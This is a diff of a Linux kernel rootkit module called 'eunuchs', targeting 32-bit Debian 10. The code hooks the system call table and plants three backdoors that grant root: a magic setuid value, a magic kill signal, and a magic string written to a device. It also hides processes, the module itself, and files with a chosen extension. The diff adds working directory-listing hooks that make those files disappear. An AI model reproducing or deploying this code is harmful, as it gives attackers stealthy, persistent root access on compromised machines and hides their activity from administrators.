@@ -2,25 +2,25 @@
  * Targets Debian 10, x86-32bit
  * Kernel 4.19.67-2+deb10u1
  *
+ * Kernel sources referenced via
+ * https://elixir.bootlin.com/linux/v4.19.67/source/
+ *
+ * Linux Kernel Module Programming Guide reference
+ * https://www.tldp.org/LDP/lkmpg/2.6/lkmpg.pdf
  *
  * TODO:
  * hide/show files
  * /etc/passwd & /etc/shadow
- **/
-
-/**
- * As root...
- * 1. add `nokaslr` to /etc/default/grub in GRUB_CMDLINE_LINUX_DEFAULT
- * 2. execute `update-grub`
- * 3. reboot
- * 4. `grep sys_call_table /boot/System.map-$(uname -r)` to
- *    find the address of the system call table and change the value below
- **/
-static unsigned long *sct = 0xc167b180;
-
-/**
- * To build:
+ *
+ * Requirements to build:
  *  `sudo apt-get install build-essential linux-headers-($uname -r)`
+ *  As root...
+ *      1. add `nokaslr` to /etc/default/grub in GRUB_CMDLINE_LINUX_DEFAULT
+ *      2. execute `update-grub`
+ *      3. reboot
+ *      4. `grep sys_call_table /boot/System.map-$(uname -r)` to
+ *         find the address of the system call table and change the value of
+ *         sct below
  *
  * To load the module:
  *  `sudo insmod eunuchs.ko`
@@ -33,7 +33,7 @@ static unsigned long *sct = 0xc167b180;
  *
  * Credential elevation... (3 ways)
  * (1) via setuid intercept:
- *  In your desired program, call `setuid(0xdead)`. Any other target uid will
+ *  In your desired program, call `setuid(0xdeadc0de)`. Any other target uid will
  *  function as usual, but this particular target uid will elevate to 0. See
  *  the program in tools/icanhazshell.c for proof of concept.
  *  `gcc -o tools/icanhazshell tools/icanhazshell.c`
@@ -41,7 +41,7 @@ static unsigned long *sct = 0xc167b180;
  * (2) via kill command:
  *  If the user sends the magic signal (#defined by EUNUCHS_MAGIC_SIGNAL) to any
  *  process, that user will be elevated to root.
- * 
+ *
  * (3) via char device:
  *  If the user writes `icanhazr00t?` (NB: you need to properly escape this
  *  string when echo'ing it), that user will be elevated to root.
@@ -58,6 +58,25 @@ static unsigned long *sct = 0xc167b180;
  *  ohaiplzshowproc [pid_to_show]   - shows specified process by pid
  *  ohaiplzhidefile ext
  **/
+
+////////////////////////////////////////////////////////////////////////////////
+// THESE VALUES CAN BE CHANGED AS DESIRED
+
+static unsigned long *sct = 0xc167b180;
+
+/* for our char char device */
+#define EUNUCHS_DEVICE_NAME "eunuchs" /* change the name of the device here if desired */
+#define EUNUCHS_CLASS_NAME "eunuchs"
+
+/* files that end in this will be hidden by default */
+#define EUNUCHS_DEFAULT_HIDE_EXT ".eunuchs"
+
+/* magic number for our setuid intercept */
+#define EUNUCHS_MAGIC_UID 0xdeadc0de
+
+/* magic number for our kill switch to elevate credentials */
+#define EUNUCHS_MAGIC_SIGNAL 42 /* 42 - the answer to all of life's mysteries */
+
 
 #include <linux/init.h>
 #include <linux/module.h>
@@ -76,13 +95,32 @@ static unsigned long *sct = 0xc167b180;
 #include <linux/list.h>         // linked lists
 #include <linux/cred.h>         // credentials, for suid
 
-#include "eunuchs.h"
+/* undef this to disable debug messages/functions */
+#define DEBUG 1
 
-MODULE_AUTHOR("meow?");
-MODULE_LICENSE("GPL");
-MODULE_DESCRIPTION("yeth plz");
-MODULE_VERSION("1.0");
-MODULE_ALIAS("kthxbye");
+#define debug(fmt, ...) \
+    if(DEBUG) \
+    { \
+        printk("[eunuchs] [%s] " fmt, __func__, ##__VA_ARGS__); \
+    }
+
+static int eunuchs_init(void);
+static void eunuchs_exit(void);
+static int eunuchs_hooks_install(void);
+static void eunuchs_hooks_remove(void);
+static void cr0_enable_write(void);
+static void cr0_disable_write(void);
+static int eunuchs_dev_init(void);
+static int eunuchs_dev_remove(void);
+static int hide_proc_by_pid(char *);
+static int show_proc_by_pid(char *);
+static int eunuchs_lists_show_all(void);
+static int eunuchs_hide_lkm(void);
+static int eunuchs_show_lkm(void);
+static int show_file_by_ext(char *);
+static int hide_file_by_ext(char *);
+static int eunuchs_elevate_creds(void);
+static int eunuchs_file_ext_list_contains(char *s);
 
 /**
  * We use the kernel's linked list implementation to track which pids and files
@@ -132,18 +170,6 @@ static ssize_t eunuchs_char_read(struct file *f, char __user *buf, size_t len, l
  *
  * This is our handler for writing to /dev/eunuchs. This can be written to by
  * `echo 'command' > /dev/eunuchs`.
- *
- *
- * Commands:
- *  ohaiplzshowallhiding            - shows all hidden pids (DEBUG ONLY)
- *  kthxbye                         - hide the LKM from lsmod (NOTE: You can't
- *                                    remove the LKM until after you make it visible)
- *  lemmesee                        - show the LKM in lsmod
- *  ohaiplzhideproc [pid_to_hide]   - hides specified process by pid
- *  ohaiplzshowproc [pid_to_show]   - shows specified process by pid
- *
- *
- * TODO: implement further interaction options for this to be able to control the lkm.
  **/
 static ssize_t eunuchs_char_write(struct file *f, const char __user *buf, size_t len, loff_t *off)
 {
@@ -280,6 +306,9 @@ static typeof(sys_getdents) *orig_getdents;
 static typeof(sys_getdents64) *orig_getdents64;
 static typeof(sys_setuid) *orig_setuid;
 static typeof(sys_kill) *orig_kill;
+static typeof(sys_fstat64) *orig_fstat64;
+/* static typeof(sys_stat) *orig_stat; */
+/* static typeof(sys_lstat) *orig_lstat; */
 
 /**
  * eunuchs_elevate_uid() -
@@ -318,13 +347,9 @@ static asmlinkage long eunuchs_setuid(uid_t uid)
     debug("setuid intercepted\n");
 
     if(uid == EUNUCHS_MAGIC_UID)
-    {
         return eunuchs_elevate_creds();
-    }
-    else
-    {
-        return orig_setuid(uid);
-    }
+
+    return orig_setuid(uid);
 }
 
 /**
@@ -337,22 +362,108 @@ static asmlinkage long eunuchs_read(int fd, char __user *buf, size_t count)
 }
 
 /**
+ * Define the linux_dirent structure for use with our getdents handler.
+ **/
+struct linux_dirent
+{
+    unsigned long       d_ino;
+    unsigned long       d_off;
+    unsigned short      d_reclen;
+    char                d_name[];
+};
+
+/**
  * getdents() handler. Probably not needed. What calls this explicitly?
+ * Strips entries out of `ls`.
  **/
 static asmlinkage int eunuchs_getdents(unsigned int fd, struct linux_dirent __user *fp, unsigned int count)
 {
-    /* debug("got getdents call\n"); */
+    long res = orig_getdents(fd, fp, count);
+
+    unsigned int offset = 0, new_len = 0;
+    struct linux_dirent *cur = NULL;
+    struct dirent *new_fp = NULL;
+
+    new_fp = kmalloc(res, GFP_KERNEL);
+    if(!new_fp)
+    {
+        debug("kmalloc failed\n");
+        return res;
+    }
+
+    /* this loop goes over the entries given in fp. if one is found which
+     * contains a suffix which we want to hide, we skip over it. otherwise, we
+     * keep it in and pass it along to the user */
+    while(offset < res)
+    {
+        char *fpp = (char *)fp + offset;
+        cur = (struct linux_dirent *)fpp;
+        if(!eunuchs_file_ext_list_contains(cur->d_name))
+        {
+            memcpy((void *)new_fp + new_len, cur, cur->d_reclen);
+            new_len += cur->d_reclen;
+        }
+
+        offset += cur->d_reclen;
+    }
+
+    memcpy(fp, new_fp, new_len);
+    res = new_len;
+
+    if(new_fp)
+        kfree(new_fp);
+
+    return res;
     return orig_getdents(fd, fp, count);
 }
 
 /**
  * getdents64() handler. This is used for large filesystems, and seems to be
- * what ls uses.
+ * what ls uses. Strips entries out of `ls`.
  **/
 static asmlinkage int eunuchs_getdents64(unsigned int fd, struct linux_dirent64 __user *fp, unsigned int count)
 {
-    /* debug("got getdents64 call\n"); */
-    return orig_getdents64(fd, fp, count);
+    long res = orig_getdents64(fd, fp, count);
+
+    unsigned int offset = 0, new_len = 0;
+    struct linux_dirent64 *cur = NULL;
+    struct dirent *new_fp = NULL;
+
+    new_fp = kmalloc(res, GFP_KERNEL);
+    if(!new_fp)
+    {
+        debug("kmalloc failed\n");
+        return res;
+    }
+
+    /* this loop goes over the entries given in fp. if one is found which
+     * contains a suffix which we want to hide, we skip over it. otherwise, we
+     * keep it in and pass it along to the user */
+    while(offset < res)
+    {
+        char *fpp = (char *)fp + offset;
+        cur = (struct linux_dirent64 *)fpp;
+        if(!eunuchs_file_ext_list_contains(cur->d_name))
+        {
+            memcpy((void *)new_fp + new_len, cur, cur->d_reclen);
+            new_len += cur->d_reclen;
+        }
+
+        offset += cur->d_reclen;
+    }
+
+    memcpy(fp, new_fp, new_len);
+    res = new_len;
+
+    if(new_fp)
+        kfree(new_fp);
+
+    return res;
+}
+
+static asmlinkage int eunuchs_fstat64(unsigned long fd, struct stat64 __user *statbuf)
+{
+    return orig_fstat64(fd, statbuf);
 }
 
 /**
@@ -366,10 +477,8 @@ static asmlinkage long eunuchs_kill(pid_t pid, int sig)
         debug("got magic signal\n");
         return eunuchs_elevate_creds();
     }
-    else
-    {
-        return orig_kill(pid, sig);
-    }
+
+    return orig_kill(pid, sig);
 }
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -450,16 +559,6 @@ static int show_file_by_ext(char *ext)
             kfree(show);
         }
     }
-    return 0;
-}
-
-static int file_hide_init(void)
-{
-    return 0;
-}
-
-static int file_hide_remove(void)
-{
     return 0;
 }
 
@@ -593,7 +692,6 @@ static void process_hide_remove(void)
     // restore the proc vfs & file operations
     proc_inode = proc_p.dentry->d_inode;
     proc_inode->i_fop = backup_proc_fileops;
-
 }
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -620,28 +718,39 @@ static int eunuchs_lists_show_all(void)
 #endif
 
 /**
+ * eunuchs_file_ext_list_contains(char *) -
+ *  Returns 1 if the hide by file extension list contains the supplied string,
+ *  0 otherwise.
+ **/
+static int eunuchs_file_ext_list_contains(char *s)
+{
+    eunuchs_file_hide_by_ext *f = NULL;
+    size_t s_len = 0, ext_len = 0;
+    if(s == NULL)
+        return 0;
+
+    s_len = strlen(s);
+    list_for_each_entry(f, &file_hide_by_ext_list, list)
+    {
+        ext_len = strlen(f->ext);
+
+        if(ext_len > s_len)
+            continue;
+
+        if(strncmp(s + s_len - ext_len, f->ext, ext_len) == 0)
+            return 1;
+    }
+    return 0;
+}
+
+/**
  * eunuchs_lists_init() -
  *  Initializes our linked lists which control hide/show of certain things.
  **/
 static int eunuchs_lists_init(void)
 {
-    // add default username to hide processes by
-    /*
-     * eunuchs_proc_hide_by_user *hide_by_un_def = kmalloc(sizeof(eunuchs_proc_hide_by_user), GFP_KERNEL);
-     * hide_by_un_def->username = kmalloc(sizeof(char) * 8, GFP_KERNEL);
-     * if(hide_by_un_def == NULL)
-     *     return -1;
-     * if(hide_by_un_def->username == NULL)
-     *     return -1;
-     */
-
     debug("setting up lists\n");
-
-    /*
-     * strncpy(hide_by_un_def->username, "eunuchs", 8);
-     * list_add(&hide_by_un_def->list, &proc_hide_by_user_list);
-     */
-
+    hide_file_by_ext(EUNUCHS_DEFAULT_HIDE_EXT);
     return 0;
 }
 
@@ -657,17 +766,6 @@ static void eunuchs_lists_free(void)
     eunuchs_file_hide_by_ext *fd = NULL, *fd2 = NULL;
 
     debug("freeing lists\n");
-
-    /* free hide_by_user list */
-    /*
-     * list_for_each_entry_safe(ud, ud2, &proc_hide_by_user_list, list)
-     * {
-     *     debug("removing %s from username hiding list\n", ud->username);
-     *     list_del(&ud->list);
-     *     kfree(ud->username);
-     *     kfree(ud);
-     * }
-     */
 
     /* free hide process by pid list */
     list_for_each_entry_safe(pd, pd2, &proc_hide_by_pid_list, list)
@@ -743,6 +841,12 @@ static int eunuchs_hooks_install(void)
     orig_kill = (typeof(sys_kill) *)sct[__NR_kill];
     sct[__NR_kill] = (void *)&eunuchs_kill;
 
+    /* orig_stat = (typeof(sys_stat) *)sct[__NR_stat]; */
+    /* sct[__NR_stat] = (void *)&eunuchs_stat; */
+    /*  */
+    /* orig_lstat = (typeof(sys_lstat) *)sct[__NR_lstat]; */
+    /* sct[__NR_lstat] = (void *)&eunuchs_lstat; */
+
     return 0;
 }
 
@@ -758,6 +862,8 @@ static void eunuchs_hooks_remove(void)
     sct[__NR_getdents64] = (void *)orig_getdents64;
     sct[__NR_setuid32] = (void *)orig_setuid;
     sct[__NR_kill] = (void *)orig_kill;
+    /* sct[__NR_stat] = (void *)orig_stat; */
+    /* sct[__NR_lstat] = (void *)orig_lstat; */
 }
 
 /**
@@ -778,7 +884,6 @@ static int eunuchs_init(void)
     /* install hooks */
     cr0_enable_write();
     eunuchs_hooks_install();
-    file_hide_init();
     process_hide_init();
     cr0_disable_write();
 
@@ -799,7 +904,6 @@ static void eunuchs_exit(void)
 
     cr0_enable_write();
     eunuchs_hooks_remove();
-    file_hide_remove();
     process_hide_remove();
     cr0_disable_write();
 
@@ -809,3 +913,9 @@ static void eunuchs_exit(void)
 
 module_init(eunuchs_init);
 module_exit(eunuchs_exit);
+
+MODULE_AUTHOR("meow?");
+MODULE_LICENSE("GPL");
+MODULE_DESCRIPTION("yeth plz");
+MODULE_VERSION("1.0");
+MODULE_ALIAS("kthxbye");
